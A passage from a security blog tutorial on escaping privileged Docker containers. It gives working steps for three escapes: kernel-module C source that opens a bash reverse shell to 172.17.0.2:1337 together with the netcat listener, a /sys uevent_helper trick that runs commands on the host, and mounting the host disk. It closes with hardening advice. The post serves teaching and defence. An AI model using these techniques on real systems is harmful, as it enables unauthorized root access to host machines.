</span></span><span style="display:flex;"><span>root           <span style="color:#ae81ff">9</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    20:57   0:00 <span style="color:#f92672">[</span>ksoftirqd/0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">10</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    20:57   0:00 <span style="color:#f92672">[</span>rcuc/0<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>To by honest, this <strong>technique</strong> was in my setup <strong>a bit flaky</strong> and I had some issues while repeating it. Do not worry if it is not working on the first try.</p>
<h4 id="cap_sys_module--load-kernel-module"><code>CAP_SYS_Module</code> – Load Kernel Module<a hidden class="anchor" aria-hidden="true" href="#cap_sys_module--load-kernel-module">#</a></h4>
<p>What do you need to <strong>load a kernel module on a Unix host</strong>? Exact, the right capability: <code>CAP_SYS_MODULE</code>. In advance, you <strong>must</strong> be in the <strong>same process namespace as</strong> the <strong>init</strong> process, but <strong>that is default</strong> in case of plain Docker setups. You think now <em>how dare you</em> this is something nobody would do!? That is exactly what happened to <em>Play-with-Docker</em>. I recommend reading the post <a href="https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host">How I Hacked Play-with-Docker and Remotely Ran Code on the Host</a> by <a href="https://twitter.com/n1mr0d5">Nimrod Stoler</a> to get all insights and the full picture.</p>
<p>The exploitation cannot be that easily weaponized, because we need a <strong>kernel module</strong> that <strong>fits</strong> the <strong>kernel version</strong>. To do so, we need to <strong>compile</strong> our own <strong>kernel module</strong> for the host system kerne. I thought initially that’s an easy one, just <em>copy&amp;paste</em> the code, compile and finished. Sounds easy? It is not that easy if you have an Ubuntu container on an Archlinux host – sigh.</p>
<p>To perform the steps I had to cheat a bit. Previously, we have performed all steps from inside the container. This time, I will <strong>pre-compile</strong> the <strong>kernel module outside</strong> of the <strong>container</strong>. Why is that necessary in my case? Because I had issues to compile the kernel module for the Archlinux kernel inside an ubuntu container with the Ubuntu toolchain. I am not a kernel developer, so I dropped to dive into the issues and let someone with more expertise to deep-dive on that topic.</p>
<p>To <strong>prepare</strong> the <strong>kernel module</strong>, you <strong>need</strong> the <strong>kernel headers</strong> for the host that runs the container. You can find them while googling through the internet and search for the kernel version headers (kernel version can be identified by <code>uname -r</code>). Afterward, you need the <em>gcc</em> compiler and <em>make</em> and that’s it.</p>
<p>The following steps have been performed on a separate host (an ubuntu system).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~# apt update <span style="color:#f92672">&amp;&amp;</span> apt install -y gcc make linux-headers 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>~# cat <span style="color:#e6db74">&lt;&lt; EOF &gt; reverse-shell.c
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#include &lt;linux/kmod.h&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#include &lt;linux/module.h&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">MODULE_LICENSE(&#34;GPL&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">MODULE_AUTHOR(&#34;AttackDefense&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">MODULE_DESCRIPTION(&#34;LKM reverse shell module&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">MODULE_VERSION(&#34;1.0&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">char* argv[] = {&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;bash -i &gt;&amp; /dev/tcp/172.17.0.2/1337 0&gt;&amp;1&#34;, NULL};
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">static char* envp[] = {&#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;, NULL };
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">static int __init reverse_shell_init(void) {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">static void __exit reverse_shell_exit(void) {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">printk(KERN_INFO &#34;Exiting\n&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">module_init(reverse_shell_init);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">module_exit(reverse_shell_exit);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>~# cat Makefile
</span></span><span style="display:flex;"><span>obj-m +<span style="color:#f92672">=</span>reverse-shell.o
</span></span><span style="display:flex;"><span>all:
</span></span><span style="display:flex;"><span>	make -C /lib/modules/<span style="color:#66d9ef">$(</span>uname -r<span style="color:#66d9ef">)</span>/build M<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span> modules
</span></span><span style="display:flex;"><span>clean:
</span></span><span style="display:flex;"><span>	make -C /lib/modules/<span style="color:#66d9ef">$(</span>uname -r<span style="color:#66d9ef">)</span>/build M<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span> clean
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>~# make
</span></span></code></pre></div><p>After the <strong>kernel module</strong> is <strong>prepared</strong>, the binary is <strong>transferred to</strong> the privileged <strong>container</strong>. This can be Base64-encoded (in my case 86 lines) or another transfer technique. With the binary transferred into the container, we can start in the <strong>listener</strong> for the <strong>reverse shell</strong>.</p>
<p><strong>Terminal 1</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~# nc -lvlp <span style="color:#ae81ff">1337</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1337</span> ...
</span></span></code></pre></div><p>Terminal 1 must be on a system that is accessible from the host, that serves the container. The listener can even be started inside the container.  If the listener is ready, the kernel module can be loaded, and the host will initiate the reverse shell.</p>
<p><strong>Terminal 2</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~# insmod reverse-shell.ko
</span></span></code></pre></div><p>And that’s it!</p>
<p><strong>Terminal 1</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~# nc -lvlp <span style="color:#ae81ff">1337</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1337</span> ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>172.17.0.1: inverse host lookup failed: Unknown host
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>172.17.0.2<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>172.17.0.1<span style="color:#f92672">]</span> <span style="color:#ae81ff">55010</span>
</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>-1<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
</span></span><span style="display:flex;"><span>bash: no job control in this shell
</span></span><span style="display:flex;"><span>root@linux-box:/#
</span></span></code></pre></div><p>A more detailed explanation can be found here <a href="https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd">Docker Container Breakout: Abusing SYS_MODULE capability!</a> by <a href="https://linkedin.com/in/wifisecguy/">Nishant Sharma</a>.</p>
<h3 id="linux-kernel-filesystem-sys">Linux kernel Filesystem <code>/sys</code><a hidden class="anchor" aria-hidden="true" href="#linux-kernel-filesystem-sys">#</a></h3>
<p>The Linux kernel offers access over the filesystem <code>/sys</code> direct access to the kernel. In case you are root – what we are in a privileged container – you can trigger events that got consumed and processed by the kernel. One of the interfaces is the <code>uevent_helper</code> which is a callback that is triggered as soon a new device is plugged in the system. The plugin a new device can be simulated as well by the <code>/sys</code> filesystem.</p>
<p>An example to execute commands on the host system is as follows:</p>
<ol>
<li>Create “callback”</li>
<li>Link “callback”</li>
<li>Trigger “callback”</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~# host_path<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>sed -n <span style="color:#e6db74">&#39;s/.*\perdir=\([^,]*\).*/\1/p&#39;</span> /etc/mtab<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>~# cat <span style="color:#e6db74">&lt;&lt; EOF &gt; /trigger.sh
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#!/bin/sh  
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ps auxf &gt; $host_path/output.txt
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>~# chmod +x /trigger.sh 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>~# echo $host_path/trigger.sh &gt; /sys/kernel/uevent_helper
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>~# echo change &gt; /sys/class/mem/null/uevent
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>~# head /output.txt
</span></span><span style="display:flex;"><span>USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">2</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    14:14   0:00 <span style="color:#f92672">[</span>kthreadd<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">3</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I    14:14   0:00  <span style="color:#ae81ff">\_</span> <span style="color:#f92672">[</span>kworker/0:0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">4</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   14:14   0:00  <span style="color:#ae81ff">\_</span> <span style="color:#f92672">[</span>kworker/0:0H<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">5</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I    14:14   0:00  <span style="color:#ae81ff">\_</span> <span style="color:#f92672">[</span>kworker/u4:0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">6</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   14:14   0:00  <span style="color:#ae81ff">\_</span> <span style="color:#f92672">[</span>mm_percpu_wq<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">7</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    14:14   0:00  <span style="color:#ae81ff">\_</span> <span style="color:#f92672">[</span>ksoftirqd/0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">8</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I    14:14   0:00  <span style="color:#ae81ff">\_</span> <span style="color:#f92672">[</span>rcu_sched<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">9</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I    14:14   0:00  <span style="color:#ae81ff">\_</span> <span style="color:#f92672">[</span>rcu_bh<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root        <span style="color:#ae81ff">10</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    14:14   0:00  <span style="color:#ae81ff">\_</span> <span style="color:#f92672">[</span>migration/0<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>As you can see, the script is executed and the output made available inside the container.</p>
<p><em>Remark: Thanks to <a href="https://twitter.com/uchi_mata">Matthias</a> for the review and remembering me to add this breakout  technique!</em></p>
<h3 id="host-devices">Host Devices<a hidden class="anchor" aria-hidden="true" href="#host-devices">#</a></h3>
<p>If you are in a privileged container, the devices are not striped and namespaced. A quick directory <strong>listing</strong> of the <strong>devices</strong> in the container shows that we have <strong>access to all</strong> of them. Since we are <code>root</code> and have all capabilities, we can <strong>mount</strong> the <strong>devices</strong> that are plugged into the host – as well as the hard drive.</p>
<p>Mounting the hard drive is giving us access to the host filesystem.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@0462216e684b:~# ls -l /dev/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>brw-rw---- <span style="color:#ae81ff">1</span> root  <span style="color:#ae81ff">994</span>   8,   <span style="color:#ae81ff">0</span> Jul <span style="color:#ae81ff">11</span> 09:20 sda
</span></span><span style="display:flex;"><span>brw-rw---- <span style="color:#ae81ff">1</span> root  <span style="color:#ae81ff">994</span>   8,   <span style="color:#ae81ff">1</span> Jul <span style="color:#ae81ff">11</span> 09:20 sda1
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>~# mkdir /hostfs
</span></span><span style="display:flex;"><span>~# mount /dev/sda1 /hostfs
</span></span><span style="display:flex;"><span>~# ls -l /hostfs/
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">132</span>
</span></span><span style="display:flex;"><span>lrwxrwxrwx   <span style="color:#ae81ff">1</span> root root     <span style="color:#ae81ff">7</span> Nov <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2019</span> bin -&gt; usr/bin
</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#ae81ff">4</span> root root  <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">13</span> 13:29 boot
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">104</span> root root <span style="color:#ae81ff">12288</span> Jul <span style="color:#ae81ff">11</span> 10:09 etc
</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#ae81ff">4</span> root root  <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">30</span> 14:47 home
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>drwxr-x---   <span style="color:#ae81ff">9</span> root root  <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">11</span> 10:09 root
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>lrwxrwxrwx   <span style="color:#ae81ff">1</span> root root     <span style="color:#ae81ff">7</span> Nov <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2019</span> sbin -&gt; usr/bin
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">10</span> root root  <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">26</span> 14:37 usr
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Escalating the access to the root directory of the host is already described in the <strong>previous part</strong> of the series <a href="../container-breakouts-part1">Part 1: Access to root directory of the Host</a>.</p>
<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
<p>We have seen three approaches that can be used if a Unix container is started with an insecure configuration.</p>
<p>The main take away message is that one should <strong>be careful if</strong> a <strong>container must</strong> be <strong>started</strong> in <strong>privileged</strong> mode. Ether it is one of the management components that are needed for controlling the container host system or a malicious agenda. <strong>Never start a container privileged if it is not necessary</strong> and review carefully the additional capabilities that a container might require.</p>
<p>Now you know why we discussed the breakout techniques with access to the root directory, before I discussed the access to the host devices.</p>
<p>If you are interested in how to use the Docker socket to get out of the container, continue with the next post <a href="../container-breakouts-part3">Part 3: Docker Socket</a>.</p>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="//blog.nody.cc/tags/docker/">Docker</a></li>
      <li><a href="//blog.nody.cc/tags/breakout/">Breakout</a></li>
      <li><a href="//blog.nody.cc/tags/security/">Security</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2024 <a href="//blog.nody.cc/">Nody´s blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
